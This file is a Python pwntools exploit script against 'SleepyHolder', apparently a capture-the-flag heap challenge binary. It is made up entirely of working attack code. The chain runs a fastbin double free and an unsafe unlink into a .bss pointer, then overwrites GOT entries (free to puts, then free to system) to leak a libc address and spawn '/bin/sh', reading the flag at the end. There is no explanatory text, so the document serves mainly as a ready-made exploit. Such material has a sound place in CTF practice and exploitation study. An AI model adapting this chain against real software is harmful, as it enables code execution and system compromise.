from pwn import *

#context.log_level="debug"

s=process('./SleepyHolder')
e=ELF('./SleepyHolder')

bss = 0x6020d0

def keep(size, secret):
	s.sendline("1")
	s.recv()
	s.sendline(size)
	s.recv()
	s.sendline(secret)
	s.recv()

def wipe(size):
	s.sendline("2")
	s.recv()
	s.sendline(size)
	s.recv()

def renew(size, secret):
	s.sendline("3")
	s.recv()
	s.sendline(size)
	s.recv()
	s.send(secret)

def leak_addr(size):
	s.sendline("2")
	s.recv()
	s.sendline(size)
	leak=u64(s.recv(6)+"\x00"*2)
	print 'leak   : ' + str(hex(leak))
	s.recv()
	return leak

def get_shell(size):
	s.sendline("2")
	s.recv()
	s.sendline(size)	

s.recv() # menu
keep("1", "A") # fastbin 
keep("2", "B") # large bin(4000)

wipe("1") # free fastbin

keep("3", "pwnWiz") # huge bin -> consolidate
wipe("1") # double free ( fastbin -> unsorted bin )

keep("1", "D") # allocate fastbin ( have 1 change unsorted bin )
renew("1", p64(0)*2+p64(bss-0x18)+p64(bss-0x10)+p64(0x20)+p64(0x91)) #unsafe_unlink to bss(smallbin)
wipe("2")

renew("1", p64(0)+p64(e.got['free'])+p64(0)+p64(bss-0x18)+"1")
renew("2", p64(e.plt['puts'])) # overwrite : free -> puts
renew("1", p64(0)+p64(e.got['atoi']))

leak = leak_addr("2") # free(0x6020c0) -> puts(atoi)
libc = leak - 0x36e80
system = libc + 0x45390
print 'libc   : ' + str(hex(libc))
print 'system : ' + str(hex(system))

renew("1", p64(0)+p64(e.got['free'])+p64(0)+p64(bss-0x18)+"1")
renew("2", p64(system)) # overwrite : free -> system 

renew("1", p64(0)+p64(e.got['malloc']))
renew("2", "/bin/sh;") # malloc -> /bin/sh;

get_shell("2")
s.sendline("cat flag")
s.interactive()
